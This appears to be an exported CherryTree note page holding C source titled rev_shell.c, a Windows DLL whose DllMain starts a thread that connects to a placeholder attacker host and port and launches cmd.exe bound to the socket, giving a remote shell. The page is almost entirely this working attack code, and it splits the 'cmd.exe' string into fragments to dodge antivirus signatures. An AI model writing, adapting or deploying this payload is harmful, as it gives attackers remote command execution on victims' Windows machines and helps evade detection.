<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>rev_shell.c</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">rev_shell.c</h1><br/><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;winsock2.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;windows.h&gt;</span><br /><br /><span style="color:#7f0044;font-weight:700">#pragma&nbsp;comment(lib,&nbsp;"ws2_32")</span><br /><br /><span style="color:#7f0044;font-weight:700">#define&nbsp;HOST&nbsp;"&lt;HOST&gt;"</span><br /><span style="color:#7f0044;font-weight:700">#define&nbsp;PORT&nbsp;&lt;PORT&gt;</span><br /><br />WSADATA&nbsp;wsaData;<br />SOCKET&nbsp;Winsock;<br />SOCKET&nbsp;Sock;<br /><span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr_in&nbsp;hax;<br /><span style="color:#7f0044;font-weight:400">char</span>&nbsp;aip_addr[<span style="color:#ff0044;font-weight:400">16</span>];<br />STARTUPINFO&nbsp;ini_processo;<br />PROCESS_INFORMATION&nbsp;processo_info;<br /><br /><span style="color:#0088ff;font-weight:400">//&nbsp;Adapted&nbsp;from&nbsp;https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;ReverseShell()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;WSAStartup(MAKEWORD(<span style="color:#ff0044;font-weight:400">2</span>,&nbsp;<span style="color:#ff0044;font-weight:400">2</span>),&nbsp;&amp;wsaData);<br />&nbsp;&nbsp;&nbsp;&nbsp;Winsock=WSASocket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;IPPROTO_TCP,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;hostent&nbsp;*host&nbsp;=&nbsp;gethostbyname(HOST);<br />&nbsp;&nbsp;&nbsp;&nbsp;strcpy(aip_addr,&nbsp;inet_ntoa(*((<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;in_addr&nbsp;*)host-&gt;h_addr)));<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;hax.sin_family&nbsp;=&nbsp;AF_INET;<br />&nbsp;&nbsp;&nbsp;&nbsp;hax.sin_port&nbsp;=&nbsp;htons(PORT);<br />&nbsp;&nbsp;&nbsp;&nbsp;hax.sin_addr.s_addr&nbsp;=&nbsp;inet_addr(aip_addr);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;WSAConnect(Winsock,&nbsp;(SOCKADDR*)&amp;hax,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(hax),&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(WSAGetLastError()&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(&amp;ini_processo,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(ini_processo));<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ini_processo.cb&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(ini_processo);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ini_processo.dwFlags&nbsp;=&nbsp;STARTF_USESTDHANDLES;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ini_processo.hStdInput&nbsp;=&nbsp;ini_processo.hStdOutput&nbsp;=&nbsp;ini_processo.hStdError&nbsp;=&nbsp;(HANDLE)Winsock;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*myArray[<span style="color:#ff0044;font-weight:400">4</span>]&nbsp;=&nbsp;{&nbsp;<span style="color:#3ad900;font-weight:400">"cm"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"d.e"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"x"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"e"</span>&nbsp;};<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;command[<span style="color:#ff0044;font-weight:400">8</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(command,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(command),&nbsp;<span style="color:#3ad900;font-weight:400">"%s%s%s%s"</span>,&nbsp;myArray[<span style="color:#ff0044;font-weight:400">0</span>],&nbsp;myArray[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;myArray[<span style="color:#ff0044;font-weight:400">2</span>],&nbsp;myArray[<span style="color:#ff0044;font-weight:400">3</span>]);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CreateProcess(<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;command,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#0088ff;font-weight:700">TRUE</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;&amp;ini_processo,&nbsp;&amp;processo_info);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />DWORD&nbsp;WINAPI&nbsp;MainThread(LPVOID&nbsp;lpParam)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;ReverseShell();<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br />}<br /><br />BOOL&nbsp;WINAPI&nbsp;DllMain(HINSTANCE&nbsp;hinstDLL,&nbsp;DWORD&nbsp;fdwReason,&nbsp;LPVOID&nbsp;lpReserved)&nbsp;<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hThread;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(fdwReason&nbsp;==&nbsp;DLL_PROCESS_ATTACH)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hThread&nbsp;=&nbsp;CreateThread(<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;MainThread,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#0088ff;font-weight:700">TRUE</span>;<br />}</div></div></div></body></html>